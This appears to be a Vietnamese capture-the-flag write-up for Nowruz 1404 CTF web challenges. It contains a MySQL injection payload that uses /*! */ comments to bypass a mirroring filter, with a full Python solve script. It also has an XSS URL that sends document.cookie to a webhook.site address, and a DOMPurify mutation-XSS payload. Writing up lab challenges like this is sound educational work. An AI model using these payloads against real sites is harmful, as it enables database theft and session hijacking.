# Nowruz 1404 CTF

## web3

### Overview

Một challenge có lẽ level medium đầu tiên mà mình thật sự hiểu, context cụ thể ngắn gọn thì bài này bị dính SQLi trong LIKE clause của MySQL, và trước khi đi tới được LIKE clause này thì input của mình đã đi qua 1 hàm tên là mirrorify với nội dung dưới đây:

```python
function mirrorify($query) 
    $s_query = str_replace(["--", "#"], "?", $query);
    $trans = [
        "(" => ")", ")" => "(",
        "<" => ">", ">" => "<",
        "[" => "]", "]" => "[",
        "{" => "}", "}" => "{",
    ];
    
    $m_query = strtr($s_query, $trans);
    return $s_query . strrev($m_query);
}
```

Tóm gọn lại nội dung hàm mirrorify, ta có:
* Đầu tiên input sẽ nhận vào ở param ?query=...., sau đó nó sẽ filter mất 2 cách comment phổ biến trong MySQL là `#` và `--` 
* Tiếp theo, nó sẽ tìm và thay thế tất cả các ký tự như cách thể hiện trong mảng trans, kiểu mirror lại từ ( => ), từ { => } và ngược lại,...
* Cuối cùng, nó sẽ return lại string kết quả finalRes = (res sau bước 1) + (res sau bước 1 và 2)

### Solution

Theo mình nhìn thấy sau khi giải end và được đọc writeup thì bài này có 2 vấn đề chính ta cần phải giải quyết, đầu tiên là làm như nào để nối/thực thi được một câu query khác nghe có vẻ dễ nhưng ta phải giải quyết đồng thời cả vấn đề hai là làm như nào để syntax vẫn đúng kể cả khi nó bị nối 2 xâu cực lỏ chả liên quan gì lại với nhau?

Để trả lời cho câu hỏi 1, ta có khá nhiều cách, nhưng làm sao để cả vấn đề 1 và vấn đề 2 cùng được giải quyết 1 lúc thì khá khó.

Intended Solution của bài này là một case khá mới (hoặc là do mình gà nên chưa biết) là cách sử dụng comment `/* */ ` với trường hợp đặc biệt là `/*! */` còn nó sú như nào thì có thể đọc thêm ở [đây](https://dev.mysql.com/doc/refman/8.4/en/comments.html#:~:text=/*!%20MySQL-specific%20code%20*/)

> Tóm tắt cho document ở trên thì nếu ta sử dụng comment đặc biệt trong MySQL `/*! */`, câu query bên trong sẽ được thực thi 

Vậy tại sao việc phát hiện ra điều này lại quan trọng? Đơn giản bởi vì nếu ta reverse lại nó, `/* !*/` thì bên trong sẽ hoàn toàn là 1 comment, nó sẽ hoàn toàn thoả mãn syntax của 1 query hợp lệ kể cả mình có viết gì ở payload gốc chưa reverse

Ok vấn đề bây giờ là xây dựng được 1 payload thoả mãn thôi, và nó có thể là 1 trong 2 payload này mình lụm được khi đọc wu của các player

```
A\") /*! UNION SELECT NULL, NULL, (SELECT table_name FROM information_schema.tables WHERE table_name LIKE \"FLAG_%\"), NULL */ +
```

> => Sau khi mapping ở mảng trans, kết hợp với reverse ta sẽ có
```
+ /* LLUN ,("\%_GALF"\ EKIL eman_elbat EREHW selbat.amehcs_noitamrofni MORF eman_elbat TCELES) ,LLUN ,LLUN TCELES NOINU !*/ ("\A
```

Cuối cùng sẽ return về:

```
A\") /*! UNION SELECT NULL, NULL, (SELECT table_name FROM information_schema.tables WHERE table_name LIKE \"FLAG_%\"), NULL */ ++ /* LLUN ,("\%_GALF"\ EKIL eman_elbat EREHW selbat.amehcs_noitamrofni MORF eman_elbat TCELES) ,LLUN ,LLUN TCELES NOINU !*/ ("\A
```

và damn, nó 100% phù hợp với syntax sau khi kết hợp với query ban đầu:

quên chưa cho query ban đầu
```
SELECT * FROM series WHERE name LIKE (\"%${user_input}%\")
```

```
SELECT * FROM series WHERE name LIKE ("%A") /*! UNION SELECT NULL, NULL, (SELECT table_name FROM information_schema.tables WHERE table_name LIKE "FLAG_%"), NULL */ ++ /* LLUN ,("%_GALF" EKIL eman_elbat EREHW selbat.amehcs_noitamrofni MORF eman_elbat TCELES) ,LLUN ,LLUN TCELES NOINU !*/ ("A%")
```

Ngoài ra có 1 cách khác là thay vì sử dụng +, ta sẽ sử dụng - ở cuối để comment lại phần đằng sau. Nhưng nhìn chung logic gần như là tương tự

Full script solve:

```python
import re
import requests

url = "https://blackmirror-chall.fmc.tf/"

def make_query(query):
    response = requests.get(url, params={"query": query})
    return response.text
# https://dev.mysql.com/doc/refman/8.4/en/comments.html#:~:text=/*!%20MySQL-specific%20code%20*/
# the one need to exploit into:
# SELECT * FROM series WHERE name LIKE (\"%${mirrorified}%\")
# The intended solution was to use the Mysql special comment => thats: /*!  sql */
sql = "SELECT table_name FROM information_schema.tables WHERE table_name LIKE \"FLAG_%\""
q1 = f"A\") /*! UNION SELECT NULL, NULL, ({sql}), NULL */ +"

print(q1) # q1= A") /*! UNION SELECT NULL, NULL, (SELECT table_name FROM information_schema.tables WHERE table_name LIKE "FLAG_%"), NULL */ +
r1 = make_query(q1)
idx = r1.rfind("FLAG_")
flag_table = r1[idx:idx+29]
print(f"[+] Table name: {flag_table}")

# second query: get the flag
q2 = f"A\") /*! UNION SELECT NULL, NULL, (SELECT flag FROM {flag_table}), NULL */ +"
r2 = make_query(q2)
flag = re.search("FMCTF{.+}", r2).group()
print(f"[+] FLAG: {flag}")
```

## web1

![image](https://hackmd.io/_uploads/rkzsHEQ21e.png)

`https://shahname-chall.fmc.tf/?count=1%22);fetch(%22https://webhook.site/65f5a9e4-8707-42e6-a2be-64a6e4c54251?cookie=%22%2BencodeURI(document.cookie));//%22`

`https://shahname-chall.fmc.tf/?count=1");alert(1);//"`


## web2:

```
seen1: S4bZz3hhH, in /ohhh-ive-seen-a-seen that resolved in robots.txt
seen2: S1IIr, in the /sitemap.xml
seen3: S1iBb, the value of data-value attr of the <input> in the page-source
seen4: S4Am4n0Oo, in the page-source's comments
seen5: Se3nJ3dDd, /xor-key, while trying to get the seen7
seen6: SOonb0Ll, b64 encoded in the index's request's header
seen7: Se3kKke3, after using Sec-Fetch-Dest: 7seen and ?name=Hajji+firuz, it was xored with the xor-key that mentioned in seen5
```


## web4:




hi mọi người, do hôm qua em có làm một challenge xss mà em chưa hiểu cách payload hoạt động nên xin phép được hỏi trên này mong được mn chỉ giáo ạ

Vì giải đã end nên em xin gửi lại description em quên k cap lại ảnh nhưng nôm na là họ cho 2 url trong đó 1 của challenge, 1 là của con bot để truy cập đường dẫn. Flag nằm trong cookie của con bot này. Hint của challenge này là `why <script>1337</script> worked but <script>alert(1)</script> don't`? Phía dưới là file họ cung cấp ạ

![image](https://hackmd.io/_uploads/H1RAKrH2Jg.png)

Ban đầu ý tưởng của em là định sử dụng cve-2025-26791 vì nó áp dụng cho DOMPurify ver <3.2.4 bài này dùng 3.2.3 nhưng em chưa giải được. Sau khi giải end em có đọc writeup của một player thì họ sử dụng `<noscript><style>/*</noscript><img%20src%20onerror=alert(1)>*/` và cái img tag thay vì ở trong comment của tag style thì nó lại nhảy được ra ngoài và được thực thi (Lẽ ra các event attribute nguy hiểm sẽ bị DOMPurify block)?
    
Em có thể xin những cách giải thích thêm về cách browser hoạt động sau khi truyền vào payload được không ông b kia giải thích em thấy sú quá k hiểu gì 
`<noscript><style>/*</noscript><img%20src%20onerror=alert(1)>*/`
![image](https://hackmd.io/_uploads/S1a3OHSn1x.png)


Summarize writeup for xss challenge:

